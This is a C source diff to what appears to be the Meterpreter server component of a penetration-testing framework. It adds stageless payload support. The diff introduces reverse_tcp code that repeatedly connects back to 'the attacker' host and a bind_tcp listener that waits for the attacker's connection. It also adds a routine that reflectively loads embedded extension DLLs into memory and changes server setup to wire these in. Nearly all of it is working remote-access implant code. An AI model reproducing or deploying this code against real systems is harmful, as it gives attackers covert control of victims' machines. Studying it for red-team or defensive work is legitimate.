@@ -4,6 +4,7 @@
 #include "metsrv.h"
 #include "../../common/common.h"
 
+extern Command *extensionCommands;
 
 char * global_meterpreter_transport = "METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
 char * global_meterpreter_url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
@@ -13,6 +14,9 @@ char * global_meterpreter_proxy_username = "METERPRETER_USERNAME_PROXY\x00\x00\x
 char * global_meterpreter_proxy_password = "METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
 int global_expiration_timeout = 0xb64be661;
 int global_comm_timeout       = 0xaf79257f;
+
+/*! @brief Number of milliseconds to wait before connection retries. */
+const DWORD RETRY_TIMEOUT_MS = 1000;
 
 #ifdef _WIN32
 
@@ -48,6 +52,120 @@ static THREAD * serverThread = NULL;
 
 /*! @brief An array of locks for use by OpenSSL. */
 static LOCK ** ssl_locks = NULL;
+
+/*!
+ * @brief Connects to a provided host/port, downloads a payload and executes it.
+ * @param host String containing the name or IP of the host to connect to.
+ * @param port Port number to connect to.
+ * @param retryAttempts The number of times to attempt to retry.
+ */
+DWORD reverse_tcp(const char* host, u_short port, short retryAttempts, SOCKET* socketBuffer)
+{
+	*socketBuffer = 0;
+
+	// start by attempting to fire up Winsock.
+	WSADATA wsaData = { 0 };
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+	{
+		return WSAGetLastError();
+	}
+
+	// prepare to connect to the attacker
+	SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	struct hostent* target = gethostbyname(host);
+	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);
+
+	struct sockaddr_in sock = { 0 };
+	sock.sin_addr.s_addr = inet_addr(targetIp);
+	sock.sin_family = AF_INET;
+	sock.sin_port = htons(port);
+
+	// try connect to the attacker at least once
+	while (connect(socketHandle, (struct sockaddr*)&sock, sizeof(sock)) == SOCKET_ERROR)
+	{
+		// retry with a sleep if it fails, or exit the process on failure
+		if (retryAttempts-- <= 0)
+		{
+			return WSAGetLastError();
+		}
+
+		Sleep(RETRY_TIMEOUT_MS);
+	}
+
+	*socketBuffer = socketHandle;
+
+	return ERROR_SUCCESS;
+}
+
+/*!
+ * @brief Listens on a port for an incoming payload request.
+ * @param port Port number to listen on.
+ */
+DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
+{
+	*socketBuffer = 0;
+
+	// start by attempting to fire up Winsock.
+	WSADATA wsaData = { 0 };
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+	{
+		return WSAGetLastError();
+	}
+
+	// prepare a connection listener for the attacker to connect to
+	SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+	struct sockaddr_in sock = { 0 };
+	sock.sin_addr.s_addr = inet_addr("0.0.0.0");
+	sock.sin_family = AF_INET;
+	sock.sin_port = htons(port);
+
+	if (bind(listenSocket, (SOCKADDR *)&sock, sizeof(struct sockaddr_in)) == SOCKET_ERROR)
+	{
+		return WSAGetLastError();
+	}
+
+	if (listen(listenSocket, 1) == SOCKET_ERROR)
+	{
+		return WSAGetLastError();
+	}
+
+	// Setup, ready to go, now wait for the connection.
+	SOCKET acceptSocket = accept(listenSocket, NULL, NULL);
+	if (acceptSocket == INVALID_SOCKET)
+	{
+		return WSAGetLastError();
+	}
+
+	// don't bother listening for other connections
+	closesocket(listenSocket);
+
+	*socketBuffer = acceptSocket;
+	return ERROR_SUCCESS;
+}
+
+DWORD estbalish_tcp_connection(char* url, SOCKET* socketBuffer)
+{
+	if (strncmp(url, "tcp://", 6) == 0)
+	{
+		char* pHost = strstr(url, "//") + 2;
+		char* pPort = strstr(pHost, ":") + 1;
+		u_short usPort = (u_short)atoi(pPort);
+
+		// if no host is specified, then we can assume that this is a bind payload, otherwise
+		// we'll assume that the payload is a reverse_tcp one and the given host is valid
+		// TODO: check to make sure this is a valid thing to do with IPv6
+		if (*pHost == ':')
+		{
+			return bind_tcp(usPort, socketBuffer);
+		}
+
+		const int iRetryAttempts = 30;
+		*(pPort - 1) = '\0';
+		return reverse_tcp(pHost, usPort, iRetryAttempts, socketBuffer);
+	}
+	return ERROR_SUCCESS;
+}
 
 /*!
  * @brief A callback function used by OpenSSL to leverage native system locks.
@@ -636,6 +754,25 @@ DWORD server_sessionid()
 #endif
 }
 
+VOID load_stageless_extensions(Remote* pRemote, ULONG_PTR fd)
+{
+	LPBYTE pExtensionStart = (LPBYTE)fd + sizeof(DWORD);
+	DWORD size = *((LPDWORD)(pExtensionStart - sizeof(DWORD)));
+
+	while (size > 0)
+	{
+		dprintf("[SERVER] Extension located at 0x%p: %u bytes", pExtensionStart, size);
+		HMODULE hLibrary = LoadLibraryR(pExtensionStart, size);
+		dprintf("[SERVER] Extension located at 0x%p: %u bytes loaded to %x", pExtensionStart, size, hLibrary);
+		initialise_extension(hLibrary, TRUE, pRemote, NULL, extensionCommands);
+
+		pExtensionStart += size + sizeof(DWORD);
+		size = *((LPDWORD)(pExtensionStart - sizeof(DWORD)));
+	}
+
+	dprintf("[SERVER] All stageless extensions loaded");
+}
+
 /*
  * Setup and run the server. This is called from Init via the loader.
  */
@@ -645,6 +782,9 @@ DWORD server_setup(SOCKET fd)
 	char cStationName[256] = { 0 };
 	char cDesktopName[256] = { 0 };
 	DWORD res = 0;
+
+	// first byte of the URL indites 's' if it's stageless
+	BOOL bStageless = global_meterpreter_url[0] == 's';
 
 	dprintf("[SERVER] Initializing...");
 
@@ -677,11 +817,24 @@ DWORD server_setup(SOCKET fd)
 			}
 
 			pRemote->url = global_meterpreter_url;
+			if (bStageless)
+			{
+				// if stageless, we ignore the first 's'
+				pRemote->url += 1;
+			}
 
 			if (strcmp(global_meterpreter_transport + 12, "TRANSPORT_SSL") == 0)
 			{
 				pRemote->transport = METERPRETER_TRANSPORT_SSL;
-				dprintf("[SERVER] Using SSL transport...");
+				dprintf("[SERVER] Using SSL transport on socket %ul...", fd);
+
+				dprintf("[SERVER] setting up stageless comms if required...");
+				res = estbalish_tcp_connection(pRemote->url, &pRemote->fd);
+				if (res != ERROR_SUCCESS)
+				{
+					dprintf("[SERVER] Failed to get TCP communications running: %u (%x)", res, res);
+					break;
+				}
 			}
 			else if (strcmp(global_meterpreter_transport + 12, "TRANSPORT_HTTPS") == 0)
 			{
@@ -695,7 +848,7 @@ DWORD server_setup(SOCKET fd)
 			}
 
 			// Do not allow the file descriptor to be inherited by child processes
-			SetHandleInformation((HANDLE)fd, HANDLE_FLAG_INHERIT, 0);
+			SetHandleInformation((HANDLE)pRemote->fd, HANDLE_FLAG_INHERIT, 0);
 
 			dprintf("[SERVER] Initializing tokens...");
 
@@ -723,7 +876,6 @@ DWORD server_setup(SOCKET fd)
 			pRemote->cpCurrentDesktopName = _strdup(cDesktopName);
 #endif
 
-
 			// Process our default SSL-over-TCP transport
 			if (pRemote->transport == METERPRETER_TRANSPORT_SSL)
 			{
@@ -745,6 +897,14 @@ DWORD server_setup(SOCKET fd)
 				dprintf("[SERVER] Registering dispatch routines...");
 				register_dispatch_routines();
 
+				if (bStageless)
+				{
+					// in the case of stageless payloads, fd contains a pointer to the extensions
+					// to load
+					dprintf("[SERVER] Loading stageless extensions");
+					load_stageless_extensions(pRemote, (ULONG_PTR)fd);
+				}
+
 				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", pRemote->transport);
 				server_dispatch(pRemote);
 
@@ -756,6 +916,14 @@ DWORD server_setup(SOCKET fd)
 			{
 				dprintf("[SERVER] Registering dispatch routines...");
 				register_dispatch_routines();
+
+				if (bStageless)
+				{
+					// in the case of stageless payloads, fd contains a pointer to the extensions
+					// to load
+					dprintf("[SERVER] Loading stageless extensions");
+					load_stageless_extensions(pRemote, (ULONG_PTR)fd);
+				}
 
 				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", pRemote->transport);
 #ifdef _WIN32
